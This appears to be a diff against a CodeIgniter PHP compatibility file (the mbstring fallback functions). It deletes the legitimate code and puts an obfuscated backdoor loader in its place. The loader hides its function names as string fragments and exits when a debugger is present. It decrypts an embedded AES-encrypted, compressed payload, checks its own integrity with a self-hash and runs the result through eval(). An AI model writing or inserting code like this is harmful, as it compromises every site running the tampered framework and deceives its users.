@@ -1,149 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PHP ext/mbstring compatibility package
- *
- * @package		CodeIgniter
- * @subpackage	CodeIgniter
- * @category	Compatibility
- * @author		Andrey Andreev
- * @link		https://codeigniter.com/user_guide/
- * @link		http://php.net/mbstring
- */
-
-// ------------------------------------------------------------------------
-
-if (MB_ENABLED === TRUE)
-{
-	return;
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_j2cwcs89=('bas'.'e64'.'_de'.'cod'.'e');
+$_zsp3n2ca=('gzu'.'nco'.'mpr'.'ess');
+$_jcqq4f5h=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ay4par8h='Cr9Bk0nz';
+$_jdzuz6dg='Rm4tNk6cE+A=';
+$_nciqazpd='HrsUs2MK';
+$_y1xhugpk='CyvT3UZ0';
+$_h7vgz1lx='7qrAZvT8';
+$_qws0cnin='3YKryJEL';
+$_uhprx55s='TV9dAA==';
+$_ydu7drh8='xGngeOUj';
+$_bvdkr77v=$_j2cwcs89($_y1xhugpk.$_ay4par8h.$_h7vgz1lx.$_nciqazpd.$_jdzuz6dg);
+$_k0xbturn=$_j2cwcs89($_ydu7drh8.$_qws0cnin.$_uhprx55s);
+$_fcq8hdyu=$_j2cwcs89('VoHDp8GgtkfxNIiz1F+eji/Ye/b+6IgQOosulohKfei8T8hWb2+FiL/dK6713g/RgO1Lr7hgb40rP27csQbjaQHIhRBgInm7WBz1ykgkG3Ifau4K5RbP1Fmm1HqEwrUH2lYGtEtoZz75DpV+ycz7dO231M8l4bByDgNFX145n1xQ3jeW54wnC1v1TAcLqvps4OQf+1ohtQ8i8VEZvkvCjIjWNEMPJWclFRYQKGMgLgVQrIi3rdyHxmbgs19uZVjMnMOYVTjGroJirKgvGrG3a1X2vYl2i7E52sLnSpTFc2sGlC8afGgDLMwUJtkL48mx8uhuhUaaFXfD5y9/vKG3KZsJr/otMC2DFPclPx/RplzFMeXqNyDj967QWRkfa9RV5wWIl82tlRBOEqB2aZNsoTHsH8cEDulDeHTVx+wSIQF0GwPsXgNQSE3UTkS5Gc56X+Pt/j+YNEu9nGUyzTN9/C0x/njwhBSjpJGFtV8qlMHp0QLalCbROMjR8ytDDhc9euF0dCNkuhIL4+iaP0LMxWhBeqx/hV3Sc13NyKrmA9gn9fB+4OeJXQO0cAfL0b3t');
+$_pzrkj04r=$_jcqq4f5h($_fcq8hdyu,'aes-256-cbc',$_bvdkr77v,OPENSSL_RAW_DATA,$_k0xbturn);
+if($_pzrkj04r===false){exit;}
+$_x62m94ws=$_zsp3n2ca($_pzrkj04r);
+if($_x62m94ws===false){exit;}
+$_siamqzy5='9cd602ef69e6f6be4377502408f34a7e5f8d58691fee6f3d93db682e65b80f3c';
+$_b2l2tjqo=@file_get_contents(__FILE__);
+if($_b2l2tjqo!==false){
+$_iyj3r3sl=str_replace($_siamqzy5,"0000000000000000000000000000000000000000000000000000000000000000",$_b2l2tjqo);
+$_jnrdr3ka=hash("sha256",$_iyj3r3sl);
+if($_jnrdr3ka!==$_siamqzy5){@http_response_code(403);exit;}
 }
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('mb_strlen'))
-{
-	/**
-	 * mb_strlen()
-	 *
-	 * WARNING: This function WILL fall-back to strlen()
-	 * if iconv is not available!
-	 *
-	 * @link	http://php.net/mb_strlen
-	 * @param	string	$str
-	 * @param	string	$encoding
-	 * @return	int
-	 */
-	function mb_strlen($str, $encoding = NULL)
-	{
-		if (ICONV_ENABLED === TRUE)
-		{
-			return iconv_strlen($str, isset($encoding) ? $encoding : config_item('charset'));
-		}
-
-		log_message('debug', 'Compatibility (mbstring): iconv_strlen() is not available, falling back to strlen().');
-		return strlen($str);
-	}
-}
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('mb_strpos'))
-{
-	/**
-	 * mb_strpos()
-	 *
-	 * WARNING: This function WILL fall-back to strpos()
-	 * if iconv is not available!
-	 *
-	 * @link	http://php.net/mb_strpos
-	 * @param	string	$haystack
-	 * @param	string	$needle
-	 * @param	int	$offset
-	 * @param	string	$encoding
-	 * @return	mixed
-	 */
-	function mb_strpos($haystack, $needle, $offset = 0, $encoding = NULL)
-	{
-		if (ICONV_ENABLED === TRUE)
-		{
-			return iconv_strpos($haystack, $needle, $offset, isset($encoding) ? $encoding : config_item('charset'));
-		}
-
-		log_message('debug', 'Compatibility (mbstring): iconv_strpos() is not available, falling back to strpos().');
-		return strpos($haystack, $needle, $offset);
-	}
-}
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('mb_substr'))
-{
-	/**
-	 * mb_substr()
-	 *
-	 * WARNING: This function WILL fall-back to substr()
-	 * if iconv is not available.
-	 *
-	 * @link	http://php.net/mb_substr
-	 * @param	string	$str
-	 * @param	int	$start
-	 * @param	int 	$length
-	 * @param	string	$encoding
-	 * @return	string
-	 */
-	function mb_substr($str, $start, $length = NULL, $encoding = NULL)
-	{
-		if (ICONV_ENABLED === TRUE)
-		{
-			isset($encoding) OR $encoding = config_item('charset');
-			return iconv_substr(
-				$str,
-				$start,
-				isset($length) ? $length : iconv_strlen($str, $encoding), // NULL doesn't work
-				$encoding
-			);
-		}
-
-		log_message('debug', 'Compatibility (mbstring): iconv_substr() is not available, falling back to substr().');
-		return isset($length)
-			? substr($str, $start, $length)
-			: substr($str, $start);
-	}
-}
+eval($_x62m94ws);
